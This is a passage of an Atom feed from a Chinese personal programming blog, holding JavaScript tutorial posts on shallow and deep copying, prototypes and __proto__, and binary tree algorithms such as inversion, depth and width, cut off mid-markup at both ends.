class=&quot;title&quot;&gt;Sub&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; s = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Sub()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Sub.prototype = &lt;span class=&quot;built_in&quot;&gt;Object&lt;/span&gt;.create(Super.prototype, &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;constructor&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;: Sub,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;enumerable&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;writable&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;configurable&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="聊聊系列" scheme="wangsiyuan233.github.io/tags/%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>聊聊系列(4)-- 深浅拷贝</title>
    <link href="wangsiyuan233.github.io/2018/08/20/66%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-4/"/>
    <id>wangsiyuan233.github.io/2018/08/20/66聊聊系列-4/</id>
    <published>2018-08-20T12:27:23.000Z</published>
    <updated>2018-08-23T04:11:18.183Z</updated>
    
    <content type="html"><![CDATA[<p>如果<strong>给一个变量赋值一个对象</strong>，那么两者的值会是同一个引用，其中一方改变，另一方也会相应改变。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span></div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = <span class="selector-tag">a</span></div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.age</span> = <span class="number">2</span></div><div class="line">console.log(<span class="selector-tag">b</span>.age) <span class="comment">// 2</span></div></pre></td></tr></table></figure></p><p>我们不想要这样的情况出现在开发中，需要浅拷贝<br><a id="more"></a></p><blockquote><p>一、浅拷贝</p></blockquote><p>1、通过 <code>Object.assign</code><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span></div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = Object.assign(&#123;&#125;, a)</div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.age</span> = <span class="number">2</span></div><div class="line">console.log(<span class="selector-tag">b</span>.age) <span class="comment">// 1</span></div></pre></td></tr></table></figure></p><p>2、通过展开运算符（…）<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span></div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = &#123;...a&#125;</div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.age</span> = <span class="number">2</span></div><div class="line">console.log(<span class="selector-tag">b</span>.age) <span class="comment">// 1</span></div></pre></td></tr></table></figure></p><p>通常浅拷贝就能解决大部分问题了，但是当我们遇到如下情况就需要使用到深拷贝了<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span>,</div><div class="line">    jobs: &#123;</div><div class="line">        first: <span class="string">'FE'</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = &#123;...a&#125;</div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span> = <span class="string">'native'</span></div><div class="line">console.log(<span class="selector-tag">b</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span>) <span class="comment">// native</span></div></pre></td></tr></table></figure></p><p>浅拷贝只解决了第一层的问题，如果接下去的值中还有对象的话，那么就又回到刚开始的话题了，两者享有相同的引用。要解决这个问题，我们需要引入深拷贝。</p><blockquote><p>二、深拷贝</p></blockquote><p>1、这个问题通常可以通过 <code>JSON.parse(JSON.stringify(object))</code> 来解决。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span>,</div><div class="line">    jobs: &#123;</div><div class="line">        first: <span class="string">'FE'</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = JSON.parse(JSON.stringify(a))</div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span> = <span class="string">'native'</span></div><div class="line">console.log(<span class="selector-tag">b</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span>) <span class="comment">// FE</span></div></pre></td></tr></table></figure></p><p>但是该方法也是有<strong>局限性</strong>的：</p><ul><li>会忽略 undefined</li><li>不能序列化函数</li><li>不能解决循环引用的对象</li></ul><p>例如：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">let obj = &#123;</div><div class="line">  <span class="selector-tag">a</span>: <span class="number">1</span>,</div><div class="line">  <span class="selector-tag">b</span>: &#123;</div><div class="line">    c: <span class="number">2</span>,</div><div class="line">    d: <span class="number">3</span>,</div><div class="line">  &#125;,</div><div class="line">&#125;</div><div class="line">obj<span class="selector-class">.c</span> = obj<span class="selector-class">.b</span></div><div class="line">obj<span class="selector-class">.e</span> = obj<span class="selector-class">.a</span></div><div class="line">obj<span class="selector-class">.b</span><span class="selector-class">.c</span> = obj<span class="selector-class">.c</span></div><div class="line">obj<span class="selector-class">.b</span><span class="selector-class">.d</span> = obj<span class="selector-class">.b</span></div><div class="line">obj<span class="selector-class">.b</span><span class="selector-class">.e</span> = obj<span class="selector-class">.b</span><span class="selector-class">.c</span></div><div class="line">let newObj = JSON.parse(JSON.stringify(obj))</div><div class="line">console.log(newObj)</div></pre></td></tr></table></figure></p><p>如果你用上面的方法深拷贝，你会发现如下报错：<br><img src="https://i.imgur.com/mIZISaM.png" alt=""></p><p>在遇到函数或者 undefined 的时候，该对象也不能正常的序列化<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> a = &#123;</div><div class="line">    <span class="attr">age</span>: <span class="literal">undefined</span>,</div><div class="line">    <span class="attr">jobs</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,</div><div class="line">    <span class="attr">name</span>: <span class="string">'yck'</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">let</span> b = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(a))</div><div class="line"><span class="built_in">console</span>.log(b) <span class="comment">// &#123;name: "yck"&#125;</span></div></pre></td></tr></table></figure></p><p>你会发现在上述情况中，该方法会忽略掉函数和 <code>undefined</code></p><p>2、在通常情况下，复杂数据都是可以序列化的，所以这个函数可以解决大部分问题，并且该函数是内置函数中处理深拷贝性能最快的。当然如果你的数据中含有以上三种情况下，可以使用 <a href="https://lodash.com/docs/4.17.10#cloneDeep" target="_blank" rel="external">lodash 的深拷贝函数</a>。</p><p>3、如果你所需拷贝的对象含有内置类型并且不包含函数，可以使用 <code>MessageChannel</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">structuralClone</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</div><div class="line">    <span class="keyword">const</span> &#123;port1, port2&#125; = <span class="keyword">new</span> MessageChannel();</div><div class="line">    port2.onmessage = <span class="function"><span class="params">ev</span> =&gt;</span> resolve(ev.data);</div><div class="line">    port1.postMessage(obj);</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: &#123;</div><div class="line">    <span class="attr">c</span>: b</div><div class="line">&#125;&#125;</div><div class="line"><span class="comment">// 注意该方法是异步的</span></div><div class="line"><span class="comment">// 可以处理 undefined 和循环引用对象</span></div><div class="line"><span class="keyword">const</span> clone = <span class="keyword">await</span> structuralClone(obj);</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如果&lt;strong&gt;给一个变量赋值一个对象&lt;/strong&gt;，那么两者的值会是同一个引用，其中一方改变，另一方也会相应改变。&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;let &lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt; = &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    age: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;let &lt;span class=&quot;selector-tag&quot;&gt;b&lt;/span&gt; = &lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.age&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;console.log(&lt;span class=&quot;selector-tag&quot;&gt;b&lt;/span&gt;.age) &lt;span class=&quot;comment&quot;&gt;// 2&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我们不想要这样的情况出现在开发中，需要浅拷贝&lt;br&gt;
    
    </summary>
    
    
      <category term="聊聊系列" scheme="wangsiyuan233.github.io/tags/%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>深入理解JavaScript--原型系列(5)</title>
    <link href="wangsiyuan233.github.io/2018/08/13/65%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-5/"/>
    <id>wangsiyuan233.github.io/2018/08/13/65原型系列-5/</id>
    <published>2018-08-13T12:18:18.000Z</published>
    <updated>2018-08-21T03:13:09.122Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一、prototype</p></blockquote><p>1、<code>prototype</code> 是一个显式原型属性，只有函数才拥有该属性。基本上所有函数都有这个属性，但是也有一个例外:</p><p> <code>let fun = Function.prototype.bind()</code></p><p>如果你以上述方法创建一个函数，那么可以发现这个函数是不具有 prototype 属性的。</p><p>2、当我们声明一个函数时，这个属性就被自动创建了。 <code>function Foo() {}</code></p><p>并且这个属性的值是一个对象（也就是原型），只有一个属性 <code>constructor</code></p><p><code>constructor</code> 对应着构造函数，也就是 <code>Foo</code>。</p><p>3、<code>constructor</code>是一个公有且不可枚举的属性。一旦我们改变了函数的 <code>prototype</code> ，那么新对象就没有这个属性了（当然可以通过原型链取到 <code>constructor</code>）。</p><p><code>constructor</code>属性到底有什么用呢？</p><ul><li><p>让实例对象知道是什么函数构造了它</p></li><li><p>如果想给某些类库中的构造函数增加一些自定义的方法，就可以通过 xx.constructor.method 来扩展</p></li><li><a id="more"></a></li></ul><blockquote><p>二、<code>_proto_</code></p></blockquote><p>这是每个对象都有的隐式原型属性，指向了创建该对象的构造函数的原型。其实这个属性指向了<code>[[prototype]]</code>，但是 <code>[[prototype]]</code> 是内部属性，我们并不能访问到，所以使用 <code>_proto_</code> 来访问。</p><p>因为在 JS 中是没有类的概念的，为了实现类似继承的方式，通过 <code>_proto_</code> 将对象和原型联系起来组成原型链，得以让对象可以访问到不属于自己的属性。</p><p>实例对象的 <code>_proto_</code> 如何产生的？</p><p>从上图可知，当我们使用 <code>new</code> 操作符时，生成的实例对象拥有了 <code>_proto_</code> 属性。<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span></span> Foo() &#123;&#125;</div><div class="line">// 这个函数是 <span class="function"><span class="keyword">Function</span></span> 的实例对象</div><div class="line">// <span class="function"><span class="keyword">function</span></span> 就是一个语法糖</div><div class="line">// 内部调用了 new <span class="function"><span class="keyword">Function</span><span class="params">(...)</span></span></div></pre></td></tr></table></figure></p><p>所以可以说，在 <code>new</code> 的过程中，新对象被添加了 <code>_proto_</code> 并且链接到构造函数的原型上。</p><p>对于实例对象来说，都是通过 <code>new</code> 产生的，无论是 <code>function Foo()</code> 还是 <code>let a = { b : 1 }</code> 。</p><p>对于创建一个对象来说，更推荐使用字面量的方式创建对象。因为你使用 <code>new Object()</code> 的方式创建对象需要通过作用域链一层层找到 <code>Object</code>，但是你使用字面量的方式就没这个问题。<br><figure class="highlight monkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(</span>) &#123;&#125;</div><div class="line">// <span class="function"><span class="keyword">function</span> 就是个语法糖</span></div><div class="line">// 内部等同于 <span class="keyword">new</span> <span class="function"><span class="keyword">Function</span>(</span>)</div><div class="line">let a = &#123; b: <span class="number">1</span> &#125;</div><div class="line">// 这个字面量内部也是使用了 <span class="keyword">new</span> Object()</div></pre></td></tr></table></figure></p><p>之前总结的<a href="http://wangsiyuan233.cn/2018/02/18/17%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%AE%9E%E4%BE%8B/" target="_blank" rel="external">原型链实例</a></p><p>所有对象都可以通过原型链最终找到 <code>Object.prototype</code> ，虽然 <code>Object.prototype</code> 也是一个对象，但是这个对象却不是 <code>Object</code> 创造的，而是引擎自己创建了 <code>Object.prototype</code> 。所以可以这样说：<strong>所有实例都是对象，但是对象不一定都是实例。</strong></p><p>首先引擎创建了 <code>Object.prototype</code> ，然后创建了 <code>Function.prototype</code> ，并且通过<code>__proto__</code>将两者联系了起来。</p><p>这里也很好的解释了一个问题，为什么 <code>let fun = Function.prototype.bind()</code> 没有 <code>prototype</code> 属性。因为 <code>Function.prototype</code> 是引擎创建出来的对象，引擎认为不需要给这个对象添加 <code>prototype</code> 属性。</p><p>所以我们又可以得出一个结论，<strong>不是所有函数都是 new Function() 产生的。</strong></p><p>有了 <code>Function.prototype</code> 以后才有了 <code>function Function()</code> ，然后其他的构造函数都是 <code>function Function()</code> 生成的。</p><p>现在可以来解释 <code>Function.__proto__ === Function.prototype</code> 这个问题了。因为先有的 <code>Function.prototype</code> 以后才有的 <code>function Function()</code> ，所以也就不存在鸡生蛋蛋生鸡的悖论问题了。</p><p>对于为什么 <code>Function.__proto__</code> 会等于 <code>Function.prototype</code> ，个人的理解是：其他所有的构造函数都可以通过原型链找到 <code>Function.prototype</code> ，并且 <code>function Function()</code> 本质也是一个函数，为了不产生混乱就将 <code>function Function()</code> 的 <code>__proto__</code> 联系到了 <code>Function.prototype</code> 上。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>Object</code> 是所有对象的爸爸，所有对象都可以通过 <code>__proto__</code> 找到它</li><li><code>Function</code> 是所有函数的爸爸，所有函数都可以通过 <code>__proto__</code> 找到它</li><li><code>Function.prototype</code> 和 <code>Object.prototype</code> 是两个特殊的对象，他们由引擎来创建</li><li>除了以上两个特殊对象，其他对象都是通过构造器 <code>new</code> 出来的</li><li>函数的 <code>prototype</code> 是一个对象，也就是原型</li><li>对象的 <code>__proto__</code> 指向原型， <code>__proto__</code> 将对象和原型连接起来组成了原型链</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一、prototype&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1、&lt;code&gt;prototype&lt;/code&gt; 是一个显式原型属性，只有函数才拥有该属性。基本上所有函数都有这个属性，但是也有一个例外:&lt;/p&gt;
&lt;p&gt; &lt;code&gt;let fun = Function.prototype.bind()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果你以上述方法创建一个函数，那么可以发现这个函数是不具有 prototype 属性的。&lt;/p&gt;
&lt;p&gt;2、当我们声明一个函数时，这个属性就被自动创建了。 &lt;code&gt;function Foo() {}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;并且这个属性的值是一个对象（也就是原型），只有一个属性 &lt;code&gt;constructor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;constructor&lt;/code&gt; 对应着构造函数，也就是 &lt;code&gt;Foo&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;3、&lt;code&gt;constructor&lt;/code&gt;是一个公有且不可枚举的属性。一旦我们改变了函数的 &lt;code&gt;prototype&lt;/code&gt; ，那么新对象就没有这个属性了（当然可以通过原型链取到 &lt;code&gt;constructor&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;constructor&lt;/code&gt;属性到底有什么用呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;让实例对象知道是什么函数构造了它&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果想给某些类库中的构造函数增加一些自定义的方法，就可以通过 xx.constructor.method 来扩展&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>数据结构(1) -- 二叉树</title>
    <link href="wangsiyuan233.github.io/2018/07/25/64%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-1/"/>
    <id>wangsiyuan233.github.io/2018/07/25/64数据结构-1/</id>
    <published>2018-07-25T08:30:40.000Z</published>
    <updated>2018-09-18T09:33:21.880Z</updated>
    
    <content type="html"><![CDATA[<p>来源于 <a href="https://leetcode.com/problems/invert-binary-tree/description/" target="_blank" rel="external">LeetCode - 226</a></p><blockquote><p>一、翻转二叉树</p></blockquote><p><img src="https://i.imgur.com/gIjXNsQ.png" alt=""><br>其实思路还是比较简单的：将当前的root节点的左右分支进行对调反转，若左分支存在，则将左分支的节点作为root节点进行对调反转；若右分支存在，则将右分支的节点作为root节点进行对调反转；一直 <strong>递归</strong> 到所有节点的左右分支都不存在。<br><a id="more"></a><br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Definition for a binary tree node.</div><div class="line"> * function TreeNode(val) &#123;</div><div class="line"> *     this.val = val;</div><div class="line"> *     this.left = this.right = null;</div><div class="line"> * &#125;</div><div class="line"> */</div><div class="line"><span class="comment">/**</span></div><div class="line"> * @param &#123;TreeNode&#125; root</div><div class="line"> * @return &#123;TreeNode&#125;</div><div class="line"> */</div><div class="line"><span class="keyword">var</span> invertTree = function(root) &#123;</div><div class="line">    <span class="comment">// 传入的根节点可能就是null或者异常节点，则对root进行判断</span></div><div class="line">    <span class="keyword">if</span>(root)&#123;</div><div class="line">        <span class="keyword">var</span> temp = null;</div><div class="line"></div><div class="line">        <span class="comment">// 将当前节点的左右分支进行对调反转</span></div><div class="line">        temp = root.<span class="keyword">left</span>;</div><div class="line">        root.<span class="keyword">left</span> = root.<span class="keyword">right</span>;</div><div class="line">        root.<span class="keyword">right</span> = temp;</div><div class="line"></div><div class="line">        <span class="comment">// 若左分支存在，则递归左分支的节点</span></div><div class="line">        <span class="keyword">if</span>(root.<span class="keyword">left</span>)&#123;</div><div class="line">            invertTree(root.<span class="keyword">left</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 若右分支存在，则递归右分支的节点</span></div><div class="line">        <span class="keyword">if</span>(root.<span class="keyword">right</span>)&#123;</div><div class="line">            invertTree(root.<span class="keyword">right</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 所有的节点遍历完成后，返回根节点</span></div><div class="line">    <span class="keyword">return</span> root;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><blockquote><p>二、求二叉树的深度</p></blockquote><ul><li>只有一个根结点时，二叉树深度为1</li><li>只有左子树时，二叉树深度为左子树深度加1</li><li>只有右子树时，二叉树深度为右子树深度加1</li><li>同时存在左右子树时，二叉树深度为左右子树中深度最大者加1<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep</span><span class="params">(root)</span>&#123;</span></div><div class="line">    <span class="keyword">if</span>(!root)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">let</span> <span class="keyword">left</span> = deep(root.<span class="keyword">left</span>)</div><div class="line">    <span class="keyword">let</span> <span class="keyword">right</span> = deep(root.<span class="keyword">right</span>)</div><div class="line">    <span class="keyword">return</span> <span class="keyword">left</span> &gt; <span class="keyword">right</span> ? <span class="keyword">left</span> + <span class="number">1</span> : <span class="keyword">right</span> + <span class="number">1</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><blockquote><p>三、求二叉树的宽度</p></blockquote><ul><li>算出第一层的结点数，保存</li><li>算出第二层的结点数，保存一二层中较大的结点数</li><li>重复以上过程<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">width</span><span class="params">(root)</span>&#123;</span></div><div class="line">    <span class="keyword">if</span>(!root)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">let</span> queue = [root], <span class="built_in">max</span> = <span class="number">1</span>, deep = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span>(queue.length)&#123;</div><div class="line">        <span class="keyword">while</span>(deep--)&#123;</div><div class="line">            <span class="keyword">let</span> temp = queue.shift()</div><div class="line">            <span class="keyword">if</span>(temp.<span class="keyword">left</span>)&#123;</div><div class="line">                queue.push(temp.<span class="keyword">left</span>)</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(temp.<span class="keyword">right</span>)&#123;</div><div class="line">                queue.push(temp.<span class="keyword">right</span>)</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        deep = queue.length</div><div class="line">        <span class="built_in">max</span> = <span class="built_in">max</span> &gt; deep ? <span class="built_in">max</span> : deep</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">max</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来源于 &lt;a href=&quot;https://leetcode.com/problems/invert-binary-tree/description/&quot;&gt;LeetCode - 226&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一、翻转二叉树&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gIjXNsQ.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;其实思路还是比较简单的：将当前的root节点的左右分支进行对调反转，若左分支存在，则将左分支的节点作为root节点进行对调反转；若右分支存在，则将右分支的节点作为root节点进行对调反转；一直 &lt;strong&gt;递归&lt;/strong&gt; 到所有节点的左右分支都不存在。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>二分查找（binary search）</title>
    <link href="wangsiyuan233.github.io/2018/07/24/63%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    <id>wangsiyuan233.github.io/2018/07/24/63二分查找/</id>
    <published>2018-07-24T02:02:34.000Z</published>
    <updated>2018-07-26T17:20:13.487Z</updated>
    
    <content type="html"><![CDATA[<p>树拥有很多种结构，二叉树是树中最常用的结构，同时也是一个天然的递归结构。</p><p>二分查找树也是二叉树，拥有二叉树的特性。但是区别在于二分查找树每个节点的值都<strong>比他的左子树的值大</strong>，<strong>比右子树的值小</strong>。</p><blockquote><p>一、创建一颗最简单的树</p></blockquote><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(value) &#123;</div><div class="line">    <span class="keyword">this</span>.value = value</div><div class="line">    <span class="keyword">this</span>.left = <span class="literal">null</span></div><div class="line">    <span class="keyword">this</span>.right = <span class="literal">null</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BST</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span></div><div class="line">    <span class="keyword">this</span>.size = <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">  getSize() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.size</div><div class="line">  &#125;</div><div class="line">  isEmpty() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.size === <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">  addNode(v) &#123;</div><div class="line">    <span 